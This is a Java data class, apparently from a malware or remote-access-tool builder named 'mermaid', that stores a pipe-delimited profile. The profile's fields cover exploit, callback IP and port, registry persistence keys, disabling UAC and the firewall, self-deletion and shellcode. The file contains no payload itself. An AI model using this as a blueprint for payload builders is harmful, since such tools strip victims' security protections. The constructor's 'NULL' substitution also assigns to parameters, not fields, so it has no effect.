package net.jlxip.mermaid;

public class Profile {
    // CREAMOS VARIABLES GLOBALES
    String NAME;
    String EXPLOIT;
    String IP;
    String PORT;
    String PATH;
    String FILE;
    String ADFOLDER;
    String HKCU;
    String HKLM;
    String DISABLEUAC;
    String DISABLEFIREWALL;
    String ADDFIREWALL;
    String MELT;
    String SHELLCODE;
    
    public Profile(String NAME, String EXPLOIT, String IP, String PORT,
    String PATH, String FILE, String ADFOLDER, String HKCU, String HKLM, String DISABLEUAC, String DISABLEFIREWALL, String ADDFIREWALL, String MELT, String SHELLCODE){
        // RELLENAMOS LAS VARIABLES GLOBALES CON LAS RECIBIDAS POR ARGUMENTOS
        this.NAME = NAME;
        this.EXPLOIT = EXPLOIT;
        this.IP = IP;
        this.PORT = PORT;
        this.PATH = PATH;
        this.FILE = FILE;
        this.ADFOLDER = ADFOLDER;
        this.HKCU = HKCU;
        this.HKLM = HKLM;
        this.DISABLEUAC = DISABLEUAC;
        this.DISABLEFIREWALL = DISABLEFIREWALL;
        this.ADDFIREWALL = ADDFIREWALL;
        this.MELT = MELT;
        this.SHELLCODE = SHELLCODE;
        
        if(ADFOLDER.equals("")){    // Si ADFOLDER está vacío...
            ADFOLDER = "NULL";  // Ponemos NULL (para que no haya errores cargándo el archivo "profiles.dat"
        }
        
        if(HKCU.equals("")){    // SI HKCU está vacío...
            HKCU = "NULL";  // Ponemos NULL
        }
        
        if(HKLM.equals("")){    // Lo mismo con HKLM
            HKLM = "NULL";      // "
        }
    }
    
    public String getString(){  // FUNCIÓN PARA CONVERTIR EL PERFIL A STRING
        String str = "";    // Creamos la variable vacía
        
        str += NAME + "|";     // Y vamos añadiendo los datos con el delimitador |
        str += EXPLOIT + "|";
        str += IP + "|";
        str += PORT + "|";
        str += PATH + "|";
        str += FILE + "|";
        str += ADFOLDER + "|";
        str += HKCU + "|";
        str += HKLM + "|";
        str += DISABLEUAC + "|";
        str += DISABLEFIREWALL + "|";
        str += ADDFIREWALL + "|";
        str += MELT + "|";
        str += SHELLCODE + "|";
        
        return str;     // Returnamos el String
    }
}
